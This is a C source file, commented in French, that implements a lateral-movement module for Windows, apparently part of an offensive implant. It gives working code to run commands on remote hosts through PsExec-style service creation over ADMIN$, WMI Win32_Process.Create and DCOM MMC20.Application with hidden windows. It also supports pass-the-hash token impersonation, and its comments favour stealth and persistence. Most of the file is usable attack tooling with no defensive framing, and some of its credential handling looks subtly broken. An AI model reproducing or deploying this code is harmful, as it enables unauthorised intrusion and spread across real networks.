/**
 * @file lateral.c
 * @brief Module de mouvement latéral - SCM, WMI, DCOM
 * 
 * Techniques implémentées:
 * - SCM: Création de service distant (PsExec-like)
 * - WMI: Exécution via Win32_Process.Create
 * - DCOM: Exécution via MMC20.Application, ShellWindows, ShellBrowserWindow
 * - Pass-the-Hash: Support via token impersonation
 */

#include <windows.h>
#include <wbemidl.h>
#include <comdef.h>
#include <stdio.h>
#include <shlobj.h>
#include "lateral.h"

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// ============================================================================
// STRUCTURES INTERNES
// ============================================================================

typedef struct _LATERAL_RESULT {
    BOOL success;
    DWORD error_code;
    char message[512];
    DWORD remote_pid;
} LATERAL_RESULT;

// ============================================================================
// SCM - SERVICE CONTROL MANAGER (PsExec-like)
// ============================================================================

/**
 * @brief Crée et exécute un service distant via SCM
 * @param target_host Nom ou IP de la machine cible
 * @param service_name Nom du service à créer
 * @param binary_path Chemin vers l'exécutable sur la cible
 * @param result Structure pour stocker le résultat
 * @return TRUE si succès
 * 
 * Équivalent à PsExec: copie un binaire et l'exécute comme service
 */
BOOL Lateral_SCM_CreateService(
    const char* target_host,
    const char* service_name,
    const char* binary_path,
    LATERAL_RESULT* result
) {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    char remote_scm[MAX_PATH];
    BOOL ret = FALSE;
    
    if (!target_host || !service_name || !binary_path || !result) {
        return FALSE;
    }
    
    memset(result, 0, sizeof(LATERAL_RESULT));
    
    // Construire le chemin UNC vers le SCM distant
    snprintf(remote_scm, sizeof(remote_scm), "\\\\%s", target_host);
    
    // Ouvrir le SCM distant
    hSCManager = OpenSCManagerA(
        remote_scm,
        SERVICES_ACTIVE_DATABASE,
        SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT
    );
    
    if (!hSCManager) {
        result->error_code = GetLastError();
        snprintf(result->message, sizeof(result->message),
            "Échec ouverture SCM distant: %lu", result->error_code);
        return FALSE;
    }
    
    // Créer le service
    hService = CreateServiceA(
        hSCManager,
        service_name,
        service_name,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binary_path,
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            // Le service existe déjà, on l'ouvre
            hService = OpenServiceA(hSCManager, service_name, SERVICE_ALL_ACCESS);
        }
        if (!hService) {
            result->error_code = GetLastError();
            snprintf(result->message, sizeof(result->message),
                "Échec création service: %lu", result->error_code);
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }
    
    // Démarrer le service
    if (!StartServiceA(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            result->error_code = err;
            snprintf(result->message, sizeof(result->message),
                "Échec démarrage service: %lu", result->error_code);
            // On ne retourne pas FALSE ici, le service est créé
        }
    }
    
    result->success = TRUE;
    snprintf(result->message, sizeof(result->message),
        "Service '%s' créé et démarré sur %s", service_name, target_host);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    
    return TRUE;
}

/**
 * @brief Supprime un service distant
 */
BOOL Lateral_SCM_DeleteService(
    const char* target_host,
    const char* service_name
) {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    char remote_scm[MAX_PATH];
    SERVICE_STATUS ss;
    
    snprintf(remote_scm, sizeof(remote_scm), "\\\\%s", target_host);
    
    hSCManager = OpenSCManagerA(remote_scm, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) return FALSE;
    
    hService = OpenServiceA(hSCManager, service_name, DELETE | SERVICE_STOP);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return FALSE;
    }
    
    // Arrêter le service d'abord
    ControlService(hService, SERVICE_CONTROL_STOP, &ss);
    Sleep(1000);
    
    // Supprimer
    BOOL ret = DeleteService(hService);
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    
    return ret;
}

/**
 * @brief Exécution PsExec-like complète
 * Copie le binaire, crée le service, exécute, nettoie
 */
BOOL Lateral_SCM_PsExec(
    const char* target_host,
    const char* local_exe_path,
    const char* arguments,
    LATERAL_RESULT* result
) {
    char remote_path[MAX_PATH];
    char service_name[64];
    char binary_path[MAX_PATH];
    BOOL ret = FALSE;
    
    if (!result) return FALSE;
    memset(result, 0, sizeof(LATERAL_RESULT));
    
    // Générer un nom de service aléatoire
    srand(GetTickCount());
    snprintf(service_name, sizeof(service_name), "Svc%08X", rand());
    
    // Chemin distant pour le binaire (ADMIN$)
    snprintf(remote_path, sizeof(remote_path), 
        "\\\\%s\\ADMIN$\\%s.exe", target_host, service_name);
    
    // Copier le binaire vers la cible
    if (!CopyFileA(local_exe_path, remote_path, FALSE)) {
        result->error_code = GetLastError();
        snprintf(result->message, sizeof(result->message),
            "Échec copie vers %s: %lu", remote_path, result->error_code);
        return FALSE;
    }
    
    // Chemin local sur la cible
    snprintf(binary_path, sizeof(binary_path),
        "%%SystemRoot%%\\%s.exe %s", service_name, arguments ? arguments : "");
    
    // Créer et démarrer le service
    ret = Lateral_SCM_CreateService(target_host, service_name, binary_path, result);
    
    // Nettoyage après exécution (optionnel, commenté pour persistance)
    // Sleep(5000);
    // Lateral_SCM_DeleteService(target_host, service_name);
    // DeleteFileA(remote_path);
    
    return ret;
}

// ============================================================================
// WMI - WINDOWS MANAGEMENT INSTRUMENTATION
// ============================================================================

/**
 * @brief Initialise COM pour WMI
 */
static BOOL WMI_InitCOM(void) {
    static BOOL initialized = FALSE;
    if (initialized) return TRUE;
    
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        return FALSE;
    }
    
    hr = CoInitializeSecurity(
        NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE, NULL
    );
    
    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
        return FALSE;
    }
    
    initialized = TRUE;
    return TRUE;
}

/**
 * @brief Exécute une commande distante via WMI Win32_Process.Create
 * @param target_host Machine cible
 * @param username Utilisateur (NULL pour credentials actuels)
 * @param password Mot de passe
 * @param command Commande à exécuter
 * @param result Structure résultat
 * @return TRUE si succès
 */
BOOL Lateral_WMI_Execute(
    const char* target_host,
    const char* username,
    const char* password,
    const char* command,
    LATERAL_RESULT* result
) {
    IWbemLocator* pLocator = NULL;
    IWbemServices* pServices = NULL;
    IWbemClassObject* pClass = NULL;
    IWbemClassObject* pMethod = NULL;
    IWbemClassObject* pInParams = NULL;
    IWbemClassObject* pOutParams = NULL;
    HRESULT hr;
    BOOL ret = FALSE;
    
    if (!result) return FALSE;
    memset(result, 0, sizeof(LATERAL_RESULT));
    
    if (!WMI_InitCOM()) {
        snprintf(result->message, sizeof(result->message), "Échec init COM");
        return FALSE;
    }
    
    // Créer le locator WMI
    hr = CoCreateInstance(
        &CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
        &IID_IWbemLocator, (void**)&pLocator
    );
    
    if (FAILED(hr)) {
        result->error_code = hr;
        snprintf(result->message, sizeof(result->message),
            "Échec création WbemLocator: 0x%08lX", hr);
        return FALSE;
    }
    
    // Construire le namespace WMI distant
    wchar_t wmi_path[MAX_PATH];
    swprintf(wmi_path, MAX_PATH, L"\\\\%hs\\root\\cimv2", target_host);
    
    BSTR bstr_path = SysAllocString(wmi_path);
    BSTR bstr_user = username ? SysAllocString((wchar_t*)username) : NULL;
    BSTR bstr_pass = password ? SysAllocString((wchar_t*)password) : NULL;
    
    // Connexion au namespace distant
    hr = pLocator->lpVtbl->ConnectServer(
        pLocator,
        bstr_path,
        bstr_user,
        bstr_pass,
        NULL, 0, NULL, NULL,
        &pServices
    );
    
    SysFreeString(bstr_path);
    if (bstr_user) SysFreeString(bstr_user);
    if (bstr_pass) SysFreeString(bstr_pass);
    
    if (FAILED(hr)) {
        result->error_code = hr;
        snprintf(result->message, sizeof(result->message),
            "Échec connexion WMI distant: 0x%08lX", hr);
        pLocator->lpVtbl->Release(pLocator);
        return FALSE;
    }
    
    // Configurer la sécurité proxy
    hr = CoSetProxyBlanket(
        (IUnknown*)pServices,
        RPC_C_AUTHN_WINNT,
        RPC_C_AUTHZ_NONE,
        NULL,
        RPC_C_AUTHN_LEVEL_CALL,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE
    );
    
    // Obtenir la classe Win32_Process
    BSTR bstr_class = SysAllocString(L"Win32_Process");
    hr = pServices->lpVtbl->GetObject(
        pServices, bstr_class, 0, NULL, &pClass, NULL
    );
    SysFreeString(bstr_class);
    
    if (FAILED(hr)) {
        result->error_code = hr;
        snprintf(result->message, sizeof(result->message),
            "Échec obtention Win32_Process: 0x%08lX", hr);
        goto cleanup;
    }
    
    // Obtenir la méthode Create
    BSTR bstr_method = SysAllocString(L"Create");
    hr = pClass->lpVtbl->GetMethod(pClass, bstr_method, 0, &pMethod, NULL);
    SysFreeString(bstr_method);
    
    if (FAILED(hr)) {
        result->error_code = hr;
        snprintf(result->message, sizeof(result->message),
            "Échec obtention méthode Create: 0x%08lX", hr);
        goto cleanup;
    }
    
    // Créer une instance des paramètres d'entrée
    hr = pMethod->lpVtbl->SpawnInstance(pMethod, 0, &pInParams);
    if (FAILED(hr)) {
        goto cleanup;
    }
    
    // Définir le paramètre CommandLine
    VARIANT var_cmd;
    VariantInit(&var_cmd);
    var_cmd.vt = VT_BSTR;
    
    wchar_t wcmd[1024];
    MultiByteToWideChar(CP_UTF8, 0, command, -1, wcmd, 1024);
    var_cmd.bstrVal = SysAllocString(wcmd);
    
    BSTR bstr_cmdline = SysAllocString(L"CommandLine");
    hr = pInParams->lpVtbl->Put(pInParams, bstr_cmdline, 0, &var_cmd, 0);
    SysFreeString(bstr_cmdline);
    VariantClear(&var_cmd);
    
    // Exécuter la méthode
    bstr_class = SysAllocString(L"Win32_Process");
    bstr_method = SysAllocString(L"Create");
    
    hr = pServices->lpVtbl->ExecMethod(
        pServices,
        bstr_class,
        bstr_method,
        0, NULL,
        pInParams,
        &pOutParams,
        NULL
    );
    
    SysFreeString(bstr_class);
    SysFreeString(bstr_method);
    
    if (FAILED(hr)) {
        result->error_code = hr;
        snprintf(result->message, sizeof(result->message),
            "Échec ExecMethod: 0x%08lX", hr);
        goto cleanup;
    }
    
    // Récupérer le PID du processus créé
    VARIANT var_pid;
    VariantInit(&var_pid);
    BSTR bstr_pid = SysAllocString(L"ProcessId");
    hr = pOutParams->lpVtbl->Get(pOutParams, bstr_pid, 0, &var_pid, NULL, NULL);
    SysFreeString(bstr_pid);
    
    if (SUCCEEDED(hr) && var_pid.vt == VT_I4) {
        result->remote_pid = var_pid.lVal;
    }
    VariantClear(&var_pid);
    
    result->success = TRUE;
    snprintf(result->message, sizeof(result->message),
        "Commande exécutée sur %s (PID: %lu)", target_host, result->remote_pid);
    ret = TRUE;
    
cleanup:
    if (pOutParams) pOutParams->lpVtbl->Release(pOutParams);
    if (pInParams) pInParams->lpVtbl->Release(pInParams);
    if (pMethod) pMethod->lpVtbl->Release(pMethod);
    if (pClass) pClass->lpVtbl->Release(pClass);
    if (pServices) pServices->lpVtbl->Release(pServices);
    if (pLocator) pLocator->lpVtbl->Release(pLocator);
    
    return ret;
}

// ============================================================================
// DCOM - DISTRIBUTED COM
// ============================================================================

// GUIDs pour les objets DCOM exploitables
static const GUID CLSID_MMC20 = 
    {0x49B2791A, 0xB1AE, 0x4C90, {0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89}};
static const GUID CLSID_ShellWindows = 
    {0x9BA05972, 0xF6A8, 0x11CF, {0xA4, 0x42, 0x00, 0xA0, 0xC9, 0x0A, 0x8F, 0x39}};
static const GUID CLSID_ShellBrowserWindow = 
    {0xC08AFD90, 0xF2A1, 0x11D1, {0x84, 0x55, 0x00, 0xA0, 0xC9, 0x1F, 0x38, 0x80}};

/**
 * @brief Énumération des méthodes DCOM disponibles
 */
typedef enum {
    DCOM_MMC20_APPLICATION,     // MMC20.Application (le plus fiable)
    DCOM_SHELL_WINDOWS,         // ShellWindows
    DCOM_SHELL_BROWSER_WINDOW   // ShellBrowserWindow
} DCOM_METHOD;

/**
 * @brief Exécute une commande via DCOM MMC20.Application
 */
BOOL Lateral_DCOM_MMC20(
    const char* target_host,
    const char* command,
    LATERAL_RESULT* result
) {
    IDispatch* pMMC = NULL;
    COSERVERINFO server_info = {0};
    MULTI_QI mqi = {0};
    HRESULT hr;
    
    if (!result) return FALSE;
    memset(result, 0, sizeof(LATERAL_RESULT));
    
    if (!WMI_InitCOM()) {
        snprintf(result->message, sizeof(result->message), "Échec init COM");
        return FALSE;
    }
    
    // Configurer les infos serveur distant
    wchar_t wtarget[256];
    MultiByteToWideChar(CP_UTF8, 0, target_host, -1, wtarget, 256);
    server_info.pwszName = wtarget;
    
    mqi.pIID = &IID_IDispatch;
    mqi.pItf = NULL;
    mqi.hr = S_OK;
    
    // Créer l'instance distante de MMC20.Application
    hr = CoCreateInstanceEx(
        &CLSID_MMC20,
        NULL,
        CLSCTX_REMOTE_SERVER,
        &server_info,
        1,
        &mqi
    );
    
    if (FAILED(hr) || FAILED(mqi.hr)) {
        result->error_code = FAILED(hr) ? hr : mqi.hr;
        snprintf(result->message, sizeof(result->message),
            "Échec création MMC20 distant: 0x%08lX", result->error_code);
        return FALSE;
    }
    
    pMMC = (IDispatch*)mqi.pItf;
    
    // Obtenir Document.ActiveView.ExecuteShellCommand
    DISPID dispid_doc;
    LPOLESTR name_doc = L"Document";
    hr = pMMC->lpVtbl->GetIDsOfNames(pMMC, &IID_NULL, &name_doc, 1, 
                                      LOCALE_USER_DEFAULT, &dispid_doc);
    
    if (FAILED(hr)) {
        result->error_code = hr;
        snprintf(result->message, sizeof(result->message),
            "Échec obtention Document: 0x%08lX", hr);
        pMMC->lpVtbl->Release(pMMC);
        return FALSE;
    }
    
    // Appeler Document
    DISPPARAMS dp_empty = {NULL, NULL, 0, 0};
    VARIANT var_doc;
    VariantInit(&var_doc);
    
    hr = pMMC->lpVtbl->Invoke(pMMC, dispid_doc, &IID_NULL, 
                              LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET,
                              &dp_empty, &var_doc, NULL, NULL);
    
    if (FAILED(hr) || var_doc.vt != VT_DISPATCH) {
        result->error_code = hr;
        snprintf(result->message, sizeof(result->message),
            "Échec appel Document: 0x%08lX", hr);
        pMMC->lpVtbl->Release(pMMC);
        return FALSE;
    }
    
    IDispatch* pDoc = var_doc.pdispVal;
    
    // Obtenir ActiveView
    DISPID dispid_view;
    LPOLESTR name_view = L"ActiveView";
    hr = pDoc->lpVtbl->GetIDsOfNames(pDoc, &IID_NULL, &name_view, 1,
                                      LOCALE_USER_DEFAULT, &dispid_view);
    
    VARIANT var_view;
    VariantInit(&var_view);
    hr = pDoc->lpVtbl->Invoke(pDoc, dispid_view, &IID_NULL,
                              LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET,
                              &dp_empty, &var_view, NULL, NULL);
    
    if (FAILED(hr) || var_view.vt != VT_DISPATCH) {
        pDoc->lpVtbl->Release(pDoc);
        pMMC->lpVtbl->Release(pMMC);
        return FALSE;
    }
    
    IDispatch* pView = var_view.pdispVal;
    
    // Appeler ExecuteShellCommand
    DISPID dispid_exec;
    LPOLESTR name_exec = L"ExecuteShellCommand";
    hr = pView->lpVtbl->GetIDsOfNames(pView, &IID_NULL, &name_exec, 1,
                                       LOCALE_USER_DEFAULT, &dispid_exec);
    
    if (SUCCEEDED(hr)) {
        // Préparer les arguments: Command, Directory, Parameters, WindowState
        VARIANT args[4];
        for (int i = 0; i < 4; i++) VariantInit(&args[i]);
        
        wchar_t wcmd[512];
        MultiByteToWideChar(CP_UTF8, 0, command, -1, wcmd, 512);
        
        // Arguments en ordre inverse (convention COM)
        args[3].vt = VT_BSTR;
        args[3].bstrVal = SysAllocString(L"cmd.exe");  // Command
        args[2].vt = VT_BSTR;
        args[2].bstrVal = SysAllocString(L"C:\\");     // Directory
        args[1].vt = VT_BSTR;
        args[1].bstrVal = SysAllocString(wcmd);        // Parameters (/c <cmd>)
        args[0].vt = VT_BSTR;
        args[0].bstrVal = SysAllocString(L"7");        // WindowState (hidden)
        
        DISPPARAMS dp = {args, NULL, 4, 0};
        
        hr = pView->lpVtbl->Invoke(pView, dispid_exec, &IID_NULL,
                                   LOCALE_USER_DEFAULT, DISPATCH_METHOD,
                                   &dp, NULL, NULL, NULL);
        
        for (int i = 0; i < 4; i++) VariantClear(&args[i]);
        
        if (SUCCEEDED(hr)) {
            result->success = TRUE;
            snprintf(result->message, sizeof(result->message),
                "Commande exécutée via MMC20 sur %s", target_host);
        }
    }
    
    pView->lpVtbl->Release(pView);
    pDoc->lpVtbl->Release(pDoc);
    pMMC->lpVtbl->Release(pMMC);
    
    return result->success;
}

/**
 * @brief Exécute via ShellWindows (explorer.exe)
 */
BOOL Lateral_DCOM_ShellWindows(
    const char* target_host,
    const char* command,
    LATERAL_RESULT* result
) {
    // Similar implementation using ShellWindows COM object
    // ShellWindows -> Item() -> Document.Application.ShellExecute()
    
    if (!result) return FALSE;
    memset(result, 0, sizeof(LATERAL_RESULT));
    
    // TODO: Implémentation complète
    snprintf(result->message, sizeof(result->message),
        "ShellWindows non implémenté - utiliser MMC20");
    
    return FALSE;
}

/**
 * @brief Wrapper générique pour exécution DCOM
 */
BOOL Lateral_DCOM_Execute(
    const char* target_host,
    const char* command,
    DCOM_METHOD method,
    LATERAL_RESULT* result
) {
    switch (method) {
        case DCOM_MMC20_APPLICATION:
            return Lateral_DCOM_MMC20(target_host, command, result);
        case DCOM_SHELL_WINDOWS:
            return Lateral_DCOM_ShellWindows(target_host, command, result);
        case DCOM_SHELL_BROWSER_WINDOW:
            // Similar to ShellWindows
            return FALSE;
        default:
            return FALSE;
    }
}

// ============================================================================
// PASS-THE-HASH SUPPORT
// ============================================================================

/**
 * @brief Configure le contexte de sécurité pour Pass-the-Hash
 * Utilise le token du thread actuel (après sekurlsa::pth ou autre)
 */
BOOL Lateral_SetPTHContext(HANDLE hToken) {
    if (!hToken) return FALSE;
    
    // Impersonate le token pour les appels réseau suivants
    if (!ImpersonateLoggedOnUser(hToken)) {
        return FALSE;
    }
    
    return TRUE;
}

/**
 * @brief Restaure le contexte de sécurité original
 */
BOOL Lateral_RevertContext(void) {
    return RevertToSelf();
}

// ============================================================================
// INTERFACE PRINCIPALE
// ============================================================================

/**
 * @brief Exécute une commande distante avec la méthode optimale
 * Essaie dans l'ordre: WMI -> DCOM -> SCM
 */
BOOL Lateral_AutoExecute(
    const char* target_host,
    const char* command,
    const char* username,
    const char* password,
    LATERAL_RESULT* result
) {
    if (!result) return FALSE;
    memset(result, 0, sizeof(LATERAL_RESULT));
    
    // Essayer WMI d'abord (plus discret)
    if (Lateral_WMI_Execute(target_host, username, password, command, result)) {
        return TRUE;
    }
    
    // Essayer DCOM MMC20
    if (Lateral_DCOM_MMC20(target_host, command, result)) {
        return TRUE;
    }
    
    // En dernier recours: SCM (plus bruyant)
    // Note: SCM nécessite un binaire, pas une commande
    snprintf(result->message, sizeof(result->message),
        "Échec WMI et DCOM - SCM nécessite un binaire");
    
    return FALSE;
}

/**
 * @brief Liste les méthodes de mouvement latéral disponibles
 */
const char* Lateral_ListMethods(void) {
    return 
        "Méthodes de mouvement latéral disponibles:\n"
        "1. SCM  - Service Control Manager (PsExec-like)\n"
        "   - Lateral_SCM_CreateService()\n"
        "   - Lateral_SCM_PsExec()\n"
        "2. WMI  - Win32_Process.Create\n"
        "   - Lateral_WMI_Execute()\n"
        "3. DCOM - Distributed COM\n"
        "   - Lateral_DCOM_MMC20() [MMC20.Application]\n"
        "   - Lateral_DCOM_ShellWindows()\n"
        "4. PTH  - Pass-the-Hash support\n"
        "   - Lateral_SetPTHContext()\n"
        "   - Lateral_RevertContext()\n";
}
